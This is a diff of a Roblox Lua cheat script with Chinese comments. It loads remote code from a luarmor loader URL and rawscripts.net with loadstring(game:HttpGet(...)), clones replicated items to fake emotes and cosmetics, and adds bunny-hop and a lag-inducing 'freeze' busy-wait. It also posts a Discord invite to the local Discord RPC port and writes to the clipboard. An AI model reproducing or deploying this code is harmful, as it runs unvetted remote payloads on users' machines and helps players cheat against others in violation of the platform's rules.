@@ -1,270 +1,236 @@
 -- [[ 📥 核心負載部署區 ]] --
 -- [[ ╔════════════════════════════════════════════════════╗ ]] --
--- [[ ║  ███████╗███████╗ █████╗ ██╗     ██████╗  █████╗   ║ ]] --
--- [[ ║  ██╔════╝██╔════╝██╔══██╗██║     ██╔══██╗██╔══██╗  ║ ]] --
--- [[ ║  █████╗  ███████╗███████║██║     ██████╔╝╚██████║  ║ ]] --
--- [[ ║  ██╔══╝  ╚════██║██╔══██║██║     ██╔══██╗ ╚═══██║  ║ ]] --
--- [[ ║  ███████╗███████║██║  ██║███████╗██║  ██║ █████╔╝  ║ ]] --
+-- [[ ║  ███████╗███████╗ █████╗ ██╗     ██████╗  █████╗   ║ ]] --
+-- [[ ║  ██╔════╝██╔════╝██╔══██╗██║     ██╔══██╗██╔══██╗  ║ ]] --
+-- [[ ║  █████╗  ███████╗███████║██║     ██████╔╝╚██████║  ║ ]] --
+-- [[ ║  ██╔══╝  ╚════██║██╔══██║██║     ██╔══██╗ ╚═══██║  ║ ]] --
+-- [[ ║  ███████╗███████║██║  ██║███████╗██║  ██║ █████╔╝  ║ ]] --
 -- [[ ╚════════════════════════════════════════════════════╝ ]] --
 
 local p, UIS, RS, VU = game.Players.LocalPlayer, game:GetService("UserInputService"), game:GetService("RunService"), game:GetService("VirtualUser")
-local bhop, freeze = false, false
-local fKN = "PageDown"
-local freezeMS = 300 
+
+-- [[ 核心同步變量 ]]
+_G.bhop = false
+_G.freeze = false
+_G.fKN = "PageDown"
+_G.freezeMS = 300 
+
 local DC_CODE = "XF4PTA5Pgp"
 local DC_URL = "https://discord.gg/" .. DC_CODE
-local BG_IMAGE_ID = "rbxassetid://117164248667049" -- 伊蕾娜背景圖
+local BG_IMAGE_ID = "rbxassetid://117164248667049" 
 
--- [[ 🚀 標頭輸出：ANSI 3D 立體斜體 ]]
+-- [[ 🚀 標頭輸出 ]]
 local function showHeader()
-    local wall = "///////////////////////////////////////////////////////////////////////////////////"
-    local floor = "\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\"
-    print("\n" .. wall)
-    print([[                                        
-  ________  ________  ________  ___       ________   _______
- |\   ____\|\   ____\|\   __  \|\  \     |\   __  \|\   __  \ 
- \ \  \___|\ \  \____| \  \|\  \ \  \    \ \  \|\  \ \  \|\  \ 
-  \ \  \___\\ \_____  \ \   __  \ \  \    \ \  _____\ \_____  \
-   \ \  \__|_\| _____\ \ \  \ \  \ \  \____\ \  \\_ \_|_____\  \
-    \ \_______\ \_______\ \__\ \__\ \_______\ \__\ \ _\\\_______\
-     \|_______|\|_______|\|__|\|__|\|_______|\|__|\|__|\|_______|
-    ]])
-    print(floor)
-    print("|||| \\\\ //// @@@@ [ SYSTEM_OVERRIDE_INITIATED ] @@@@ //// \\\\ ||||")
-    print("|||| OPERATOR : @E5alR9          |||| SECURITY : LEVEL_MAX     ||||")
-    print("|||| STATUS   : OVERCLOCKED      |||| KERNEL   : STABLE        ||||")
-    print(floor)
-    print(wall .. "\n")
+    local wall = "///////////////////////////////////////////////////////////////////////////////////"
+    local floor = "\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\"
+    print("\n" .. wall)
+    print([[										
+  ________  ________  ________  ___       ________   _______
+ |\   ____\|\   ____\|\   __  \|\  \     |\   __  \|\   __  \ 
+ \ \  \___|\ \  \____| \  \|\  \ \  \    \ \  \|\  \ \  \|\  \ 
+  \ \  \___\\ \_____  \ \   __  \ \  \    \ \  _____\ \_____  \
+   \ \  \__|_\| _____\ \ \  \ \  \ \  \____\ \  \\_ \_|_____\  \
+    \ \_______\ \_______\ \__\ \__\ \_______\ \__\ \ _\\\_______\
+     \|_______|\|_______|\|__|\|__|\|_______|\|__|\|__|\|_______|
+    ]])
+    print(floor)
+    print("|||| \\\\ //// @@@@ [ SYSTEM_OVERRIDE_INITIATED ] @@@@ //// \\\\ ||||")
+    print(wall .. "\n")
 end
-
 showHeader()
 
 -- [[ 🛠️ 模組一：資源部署 ]]
 task.spawn(function()
-    print("//// #### [M1] DATA_DEPLOYMENT_START #### ////")
-    _G.emoteSwaps = { { current = "APose", needed = "SnowmobileCruise" } }
-    
-    local function dl(u) 
-        task.spawn(function() 
-            print("\\\\\\\\ HTTP \\\\\\\\ <REQUESTING_REMOTE_PAYLOAD> ...")
-            local s, e = pcall(function() loadstring(game:HttpGet(u))() end) 
-            if s then 
-                print("|||| SUCCESS |||| %%% Payload_Injected_Successfully") 
-            else 
-                print("|||| ERROR |||| !!! Failure: " .. tostring(e)) 
-            end
-        end) 
-    end
-    dl("https://api.luarmor.net/files/v3/loaders/36d5417f898691cb6c6d347b077e01e2.lua")
+    _G.emoteSwaps = { { current = "APose", needed = "SnowmobileCruise" } }
+    local function dl(u) 
+        task.spawn(function() pcall(function() loadstring(game:HttpGet(u))() end) end) 
+    end
+    dl("https://api.luarmor.net/files/v3/loaders/36d5417f898691cb6c6d347b077e01e2.lua")
 
-    pcall(function()
-        local S = game:GetService("ReplicatedStorage").Items
-        print("\\\\\\\\ DATA \\\\\\\\ [SCANNING_REPLICATED_OBJECTS] ...")
-        local function dup(folder, old, new) 
-            local i = folder:FindFirstChild(old) 
-            if i then 
-                print("//// CLONE //// " .. old .. " ===>>> " .. new)
-                i:Clone().Parent = folder i.Name = new 
-            end 
-        end
-        dup(S.Emotes, "RockinStride", "Stride")
-        dup(S.Emotes, "Broom", "SnowmobileCruise")
-        dup(S.Cosmetics, "ToxicInferno", "BorealisAurora")
-    end)
-
-    p.Idled:Connect(function() 
-        VU:CaptureController() 
-        VU:ClickButton2(Vector2.zero) 
-        print("//// PULSE //// Activity_Heartbeat_Sent")
-    end)
+    pcall(function()
+        local S = game:GetService("ReplicatedStorage").Items
+        local function dup(folder, old, new) 
+            local i = folder:FindFirstChild(old) 
+            if i then i:Clone().Parent = folder i.Name = new end 
+        end
+        dup(S.Emotes, "RockinStride", "Stride")
+        dup(S.Emotes, "Broom", "SnowmobileCruise")
+        dup(S.Cosmetics, "ToxicInferno", "BorealisAurora")
+    end)
 end)
 
--- [[ ⚙️ 模組二：引擎同步 (Deep Stride) ]]
+-- [[ ⚙️ 模組二：引擎同步 ]]
 task.spawn(function()
-    task.wait(1.5) 
-    print("\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\ [ ENGINE_SYNCHRONIZATION ] ////////////////////")
-    if #game.Players:GetPlayers() == 1 then
-        print("\\\\ CHECK \\\\ Solo_Mode_Active...")
-        local E = game:GetService("ReplicatedStorage"):WaitForChild("Items"):WaitForChild("Emotes")
-        local s, r, b = E:FindFirstChild("Stride"), E:FindFirstChild("RockinStride"), E:FindFirstChild("Broom")
-        
-        if s and r and b then
-            print("\\\\ SYNC \\\\ Overwriting_Classic_Modules...")
-            local bm, rm = b:FindFirstChild("EmoteModuleClassic"), r:FindFirstChild("EmoteModuleClassic")
-            if bm and rm then
-                local nm = bm:Clone()
-                nm:ClearAllChildren()
-                for _, o in ipairs(rm:GetChildren()) do o:Clone().Parent = nm end
-                rm:Destroy()
-                nm.Name, nm.Parent = "EmoteModuleClassic", r
-            end
-            s:ClearAllChildren()
-            for _, i in ipairs(r:GetChildren()) do i:Clone().Parent = s end
-            print("\\\\ DONE \\\\ Deep_Stride_Integrity_Check_Pass")
-        end
-    end
-    print("\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\")
+    task.wait(1.5) 
+    if #game.Players:GetPlayers() == 1 then
+        local E = game:GetService("ReplicatedStorage"):WaitForChild("Items"):WaitForChild("Emotes")
+        local s, r, b = E:FindFirstChild("Stride"), E:FindFirstChild("RockinStride"), E:FindFirstChild("Broom")
+        if s and r and b then
+            local bm, rm = b:FindFirstChild("EmoteModuleClassic"), r:FindFirstChild("EmoteModuleClassic")
+            if bm and rm then
+                local nm = bm:Clone()
+                nm:ClearAllChildren()
+                for _, o in ipairs(rm:GetChildren()) do o:Clone().Parent = nm end
+                rm:Destroy()
+                nm.Name, nm.Parent = "EmoteModuleClassic", r
+            end
+            s:ClearAllChildren()
+            for _, i in ipairs(r:GetChildren()) do i:Clone().Parent = s end
+        end
+    end
 end)
 
--- [[ 🖥️ 模組三：介面與核心功能 ]]
+-- [[ 🖥️ 模組三：介面與核心功能 (代碼結構維持原樣) ]]
 local function createUI()
-    print("//// #### [UI] GENERATING_CONSOLE_INTERFACE #### ////")
-    if p.PlayerGui:FindFirstChild("E5_Console") then p.PlayerGui.E5_Console:Destroy() end
-    local sg = Instance.new("ScreenGui", p.PlayerGui)
-    sg.Name, sg.ResetOnSpawn, sg.DisplayOrder = "E5_Console", false, 999
-    
-    local m = Instance.new("Frame", sg)
-    m.Size, m.Position = UDim2.new(0, 240, 0, 320), UDim2.new(0, 15, 0.4, 0)
-    m.BackgroundColor3, m.BackgroundTransparency, m.BorderSizePixel = Color3.new(0,0,0), 1, 1
-    m.Active, m.Draggable, m.ClipsDescendants = true, true, true 
+    if p.PlayerGui:FindFirstChild("E5_Console") then p.PlayerGui.E5_Console:Destroy() end
+    local sg = Instance.new("ScreenGui", p.PlayerGui)
+    sg.Name, sg.ResetOnSpawn, sg.DisplayOrder = "E5_Console", false, 999
+    
+    local m = Instance.new("Frame", sg)
+    m.Size, m.Position = UDim2.new(0, 240, 0, 320), UDim2.new(0, 15, 0.4, 0)
+    m.BackgroundColor3, m.BackgroundTransparency, m.BorderSizePixel = Color3.new(0,0,0), 1, 1
+    m.Active, m.Draggable, m.ClipsDescendants = true, true, true 
 
-    local bg = Instance.new("ImageLabel", m)
-    bg.Size, bg.BackgroundTransparency, bg.ImageTransparency, bg.ZIndex = UDim2.new(1, 0, 1, 0), 1, 0, 0
-    bg.Image, bg.ScaleType = BG_IMAGE_ID, Enum.ScaleType.Stretch
+    local bg = Instance.new("ImageLabel", m)
+    bg.Size, bg.BackgroundTransparency, bg.ImageTransparency, bg.ZIndex = UDim2.new(1, 0, 1, 0), 1, 0, 0
+    bg.Image, bg.ScaleType = BG_IMAGE_ID, Enum.ScaleType.Stretch
 
-    local bar = Instance.new("Frame", m)
-    bar.Size, bar.BackgroundColor3, bar.ZIndex = UDim2.new(1, 0, 0, 25), Color3.new(0.05, 0.05, 0.05), 2
-    
-    -- X 關閉按鈕
-    local xBtn = Instance.new("TextButton", bar)
-    xBtn.Name, xBtn.Size, xBtn.Position = "CloseBtn", UDim2.new(0, 25, 0, 25), UDim2.new(1, -25, 0, 0)
-    xBtn.Text, xBtn.TextColor3, xBtn.ZIndex = "X", Color3.new(1, 0.2, 0.2), 3
-    xBtn.TextSize, xBtn.BackgroundTransparency = 18, 1
-    xBtn.MouseButton1Click:Connect(function() sg:Destroy() end)
+    local bar = Instance.new("Frame", m)
+    bar.Size, bar.BackgroundColor3, bar.ZIndex = UDim2.new(1, 0, 0, 25), Color3.new(0.05, 0.05, 0.05), 2
+    
+    local xBtn = Instance.new("TextButton", bar)
+    xBtn.Name, xBtn.Size, xBtn.Position = "CloseBtn", UDim2.new(0, 25, 0, 25), UDim2.new(1, -25, 0, 0)
+    xBtn.Text, xBtn.TextColor3, xBtn.ZIndex = "X", Color3.new(1, 0.2, 0.2), 3
+    xBtn.TextSize, xBtn.BackgroundTransparency = 18, 1
+    xBtn.MouseButton1Click:Connect(function() sg:Destroy() end)
 
-    local minBtn = Instance.new("TextButton", bar)
-    minBtn.Size, minBtn.Position = UDim2.new(0, 25, 0, 25), UDim2.new(1, -50, 0, 0)
-    minBtn.Text, minBtn.TextColor3, minBtn.ZIndex = "-", Color3.new(1, 1, 1), 3
-    minBtn.TextSize, minBtn.BackgroundTransparency = 22, 1
+    local minBtn = Instance.new("TextButton", bar)
+    minBtn.Size, minBtn.Position = UDim2.new(0, 25, 0, 25), UDim2.new(1, -50, 0, 0)
+    minBtn.Text, minBtn.TextColor3, minBtn.ZIndex = "-", Color3.new(1, 1, 1), 3
+    minBtn.TextSize, minBtn.BackgroundTransparency = 22, 1
 
-    local content = Instance.new("Frame", m)
-    content.Size, content.Position, content.BackgroundTransparency, content.ZIndex = UDim2.new(1, 0, 0, 110), UDim2.new(0, 0, 1, -115), 1, 2
-    
-    -- 熱鍵按鈕 (附帶修改通知)
-    local l = Instance.new("TextButton", content)
-    l.Size, l.Position, l.ZIndex = UDim2.new(0.9, 0, 0, 45), UDim2.new(0.05, 0, 0, 5), 3
-    l.Text, l.TextSize = fKN, 20
-    l.BackgroundColor3, l.TextColor3, l.BackgroundTransparency, l.Font = Color3.new(0,0,0), Color3.new(1,1,1), 0.4, Enum.Font.Code
-    l.MouseButton1Click:Connect(function()
-        l.Text = "..."
-        local con; con = UIS.InputBegan:Connect(function(i) 
-            if i.UserInputType == Enum.UserInputType.Keyboard then 
-                fKN = i.KeyCode.Name 
-                l.Text = fKN 
-                con:Disconnect() 
-                -- [新增] 修改按鍵通知
-                game:GetService("StarterGui"):SetCore("SendNotification", { Title = "SYSTEM"; Text = "Key Changed to: " .. fKN; Duration = 2; })
-            end 
-        end)
-    end)
+    local content = Instance.new("Frame", m)
+    content.Size, content.Position, content.BackgroundTransparency, content.ZIndex = UDim2.new(1, 0, 0, 110), UDim2.new(0, 0, 1, -115), 1, 2
+    
+    local l = Instance.new("TextButton", content)
+    l.Size, l.Position, l.ZIndex = UDim2.new(0.9, 0, 0, 45), UDim2.new(0.05, 0, 0, 5), 3
+    l.Text, l.TextSize = _G.fKN, 20
+    l.BackgroundColor3, l.TextColor3, l.BackgroundTransparency, l.Font = Color3.new(0,0,0), Color3.new(1,1,1), 0.4, Enum.Font.Code
+    l.MouseButton1Click:Connect(function()
+        l.Text = "..."
+        local con; con = UIS.InputBegan:Connect(function(i) 
+            if i.UserInputType == Enum.UserInputType.Keyboard then 
+                _G.fKN = i.KeyCode.Name 
+                l.Text = _G.fKN 
+                con:Disconnect() 
+                game:GetService("StarterGui"):SetCore("SendNotification", { Title = "SYSTEM"; Text = "Key Changed to: " .. _G.fKN; Duration = 2; })
+            end 
+        end)
+    end)
 
-    -- 延遲輸入框 (附帶修改通知)
-    local tb = Instance.new("TextBox", content)
-    tb.Size, tb.Position, tb.ZIndex = UDim2.new(0.9, 0, 0, 45), UDim2.new(0.05, 0, 0, 55), 3
-    tb.BackgroundColor3, tb.TextColor3, tb.Text, tb.TextSize = Color3.new(0,0,0), Color3.new(1,1,0), tostring(freezeMS), 22
-    tb.BackgroundTransparency, tb.Font = 0.4, Enum.Font.Code
-    tb.FocusLost:Connect(function(enter)
-        local val = tonumber(tb.Text)
-        if val then 
-            freezeMS = math.clamp(val, 0, 5000) 
-            tb.Text = tostring(freezeMS) 
-            -- [新增] 修改延遲通知
-            game:GetService("StarterGui"):SetCore("SendNotification", { Title = "SYSTEM"; Text = "MS Adjusted: " .. freezeMS .. "ms"; Duration = 2; })
-        end
-    end)
+    local tb = Instance.new("TextBox", content)
+    tb.Size, tb.Position, tb.ZIndex = UDim2.new(0.9, 0, 0, 45), UDim2.new(0.05, 0, 0, 55), 3
+    tb.BackgroundColor3, tb.TextColor3, tb.Text, tb.TextSize = Color3.new(0,0,0), Color3.new(1,1,0), tostring(_G.freezeMS), 22
+    tb.BackgroundTransparency, tb.Font = 0.4, Enum.Font.Code
+    tb.FocusLost:Connect(function(enter)
+        local val = tonumber(tb.Text)
+        if val then 
+            _G.freezeMS = math.clamp(val, 0, 5000) 
+            tb.Text = tostring(_G.freezeMS) 
+            game:GetService("StarterGui"):SetCore("SendNotification", { Title = "SYSTEM"; Text = "MS Adjusted: " .. _G.freezeMS .. "ms"; Duration = 2; })
+        end
+    end)
 
-    minBtn.MouseButton1Click:Connect(function()
-        local min = (m.Size.Y.Offset > 30)
-        content.Visible = not min
-        m.Size = min and UDim2.new(0, 80, 0, 25) or UDim2.new(0, 240, 0, 320)
-        minBtn.Text = min and "+" or "-"
-    end)
+    minBtn.MouseButton1Click:Connect(function()
+        local min = (m.Size.Y.Offset > 30)
+        content.Visible = not min
+        m.Size = min and UDim2.new(0, 80, 0, 25) or UDim2.new(0, 240, 0, 320)
+        minBtn.Text = min and "+" or "-"
+    end)
 end
 
--- 第一次執行立即啟動
 task.spawn(function()
-    print("//// #### [M3] BOOTING_SYSTEM_INTERFACE #### ////")
-    createUI() 
-    local function run(c)
-        local h = c:WaitForChild("Head", 5)
-        if h then h.Transparency = 1 for _, v in pairs(h:GetChildren()) do if v:IsA("Decal") then v.Transparency = 1 end end end
-        task.wait(1)
-        pcall(function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Korblox-All-61127"))() end)
-    end
-    if p.Character then task.spawn(run, p.Character) end
-    p.CharacterAdded:Connect(function(char) task.wait(0.5) createUI() run(char) end)
-
-    -- [外加] 全體玩家復活監控邏輯 (不影響原本 M3)
-    local function monitorOther(player)
-        player.CharacterAdded:Connect(function(char) run(char) end)
-    end
-    for _, player in pairs(game.Players:GetPlayers()) do if player ~= p then monitorOther(player) end end
-    game.Players.PlayerAdded:Connect(monitorOther)
+    createUI() 
+    local function run(c)
+        local h = c:WaitForChild("Head", 5)
+        if h then h.Transparency = 1 end
+        task.wait(1)
+        pcall(function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Korblox-All-61127"))() end)
+    end
+    if p.Character then task.spawn(run, p.Character) end
+    p.CharacterAdded:Connect(function(char) task.wait(0.5) createUI() run(char) end)
 end)
 
--- Bhop 與 Deep Freeze 邏輯
-UIS.InputBegan:Connect(function(i, g) 
-    if g then return end 
-    if i.KeyCode == Enum.KeyCode.Space then bhop = true 
-    elseif i.KeyCode.Name == fKN then 
-        freeze = true 
-        print("\\\\ INPUT \\\\ [[ FREEZE_ENGAGED ]]")
-    end 
+-- [[ 核心判定邏輯 ]]
+UIS.InputBegan:Connect(function(i, g) 
+    if g then return end 
+    if i.KeyCode == Enum.KeyCode.Space then _G.bhop = true 
+    elseif i.KeyCode.Name == _G.fKN then _G.freeze = true end 
 end)
-UIS.InputEnded:Connect(function(i) 
-    if i.KeyCode == Enum.KeyCode.Space then bhop = false 
-    elseif i.KeyCode.Name == fKN then freeze = false end 
+UIS.InputEnded:Connect(function(i) 
+    if i.KeyCode == Enum.KeyCode.Space then _G.bhop = false 
+    elseif i.KeyCode.Name == _G.fKN then _G.freeze = false end 
 end)
 
 RS.Heartbeat:Connect(function()
-    local c = p.Character
-    local r = c and c:FindFirstChild("HumanoidRootPart")
-    
-    -- [外加] Raycast 參數
-    local lp = RaycastParams.new()
-    lp.FilterDescendantsInstances = {c}
-    lp.FilterType = Enum.RaycastFilterType.Exclude
-
-    if bhop and c and c:FindFirstChildOfClass("Humanoid") and c:FindFirstChildOfClass("Humanoid").FloorMaterial ~= Enum.Material.Air then c:FindFirstChildOfClass("Humanoid"):ChangeState(3) end
-    if freeze and r then
-        -- [外加] Raycast 判定：下方 20 或 前方 15
-        if workspace:Raycast(r.Position, Vector3.new(0,-20,0), lp) or workspace:Raycast(r.Position, r.CFrame.LookVector*15, lp) then
-            game:GetService("StarterGui"):SetCore("SendNotification", { Title = "SYSTEM"; Text = "Freeze: " .. freezeMS .. "ms"; Duration = 0.5; })
-            local t = os.clock() 
-            local delayTime = (tonumber(freezeMS) or 300) / 1000
-            while os.clock() - t < delayTime do end 
-        end
-    end
+    local c = p.Character
+    local r = c and c:FindFirstChild("HumanoidRootPart")
+    if _G.bhop and c and c:FindFirstChildOfClass("Humanoid") and c:FindFirstChildOfClass("Humanoid").FloorMaterial ~= Enum.Material.Air then c:FindFirstChildOfClass("Humanoid"):ChangeState(3) end
+    if _G.freeze and r then
+        local t = os.clock() 
+        local delayTime = (tonumber(_G.freezeMS) or 300) / 1000
+        while os.clock() - t < delayTime do end 
+    end
 end)
 
--- [[ 📡 Module 4: Social Daemon ]]
+-- [[ 📡 Module 4: Social Daemon (精確對照修改) ]]
 task.spawn(function()
-    print("//// [M4] STARTING SOCIAL_DAEMON ////////")
-    local bindable = Instance.new("BindableFunction")
-    bindable.OnInvoke = function(a)
-        if a == "YES" then
-            if setclipboard then setclipboard(DC_URL) end
-            local req = (syn and syn.request) or (http and http.request) or http_request or request
-            if req then pcall(function() req({Url = "http://127.0.0.1:6463/rpc?v=1", Method = "POST", Headers = {["Content-Type"] = "application/json", ["Origin"] = "https://discord.com"}, Body = game:GetService("HttpService"):JSONEncode({cmd = "INVITE_BROWSER", args = {code = DC_CODE}, nonce = game:GetService("HttpService"):GenerateGUID(false)})}) end) end
-        -- [外加] NO 回饋邏輯
-        elseif a == "NO" then
-            print("|||| [SOCIAL] DECLINED :-( ////////")
-            task.delay(0.5, function()
-                game:GetService("StarterGui"):SetCore("SendNotification", { 
-                    Title = ":("; 
-                    Text = "Maybe next time..."; 
-                    Duration = 5; 
-                })
-            end)
-        end
-    end
-    task.wait(5)
-    pcall(function() game:GetService("StarterGui"):SetCore("SendNotification", {Title = "E5alR9 - DISCORD", Text = "Join for more useful?", Duration = 99999, Button1 = "YES", Button2 = "NO", Callback = bindable}) end)
+    local bindable = Instance.new("BindableFunction")
+    bindable.OnInvoke = function(answer)
+        if answer == "YES" then
+            print("|||| [SOCIAL] ACCEPTED ////////")
+            local req = (syn and syn.request) or (http and http.request) or http_request or request
+            if req then 
+                pcall(function() 
+                    req({ 
+                        Url = "http://127.0.0.1:6463/rpc?v=1", 
+                        Method = "POST", 
+                        Headers = {["Content-Type"] = "application/json", ["Origin"] = "https://discord.com"}, 
+                        Body = game:GetService("HttpService"):JSONEncode({ 
+                            cmd = "INVITE_BROWSER", 
+                            args = { code = DC_CODE }, 
+                            nonce = game:GetService("HttpService"):GenerateGUID(false) 
+                        }) 
+                    }) 
+                end) 
+            end
+            if setclipboard then setclipboard(DC_URL) end
+        elseif answer == "NO" then
+            print("|||| [SOCIAL] DECLINED :-( ////////")
+            task.delay(0.5, function()
+                game:GetService("StarterGui"):SetCore("SendNotification", { 
+                    Title = ":("; 
+                    Text = "Maybe next time..."; 
+                    Duration = 5; 
+                })
+            end)
+        end
+    end
+
+    task.wait(5)
+    pcall(function()
+        game:GetService("StarterGui"):SetCore("SendNotification", { 
+            Title = "E5alR9 - DISCORD", 
+            Text = "Join for more useful?", 
+            Duration = 99999, 
+            Button1 = "YES", 
+            Button2 = "NO", 
+            Callback = bindable 
+        })
+    end)
 end)
 
--- [[ 📡 結尾輸出 ]]
 task.spawn(function()
-    task.wait(6)
-    print("\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\ ALL SYSTEMS LOADED | @E5ALR9 ////////////////////")
-    print("//// [SYSTEM] READY TO OPERATE AT RING-0 ////")
+    task.wait(6)
+    print("\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\ ALL SYSTEMS LOADED | @E5ALR9 ////////////////////")
 end)
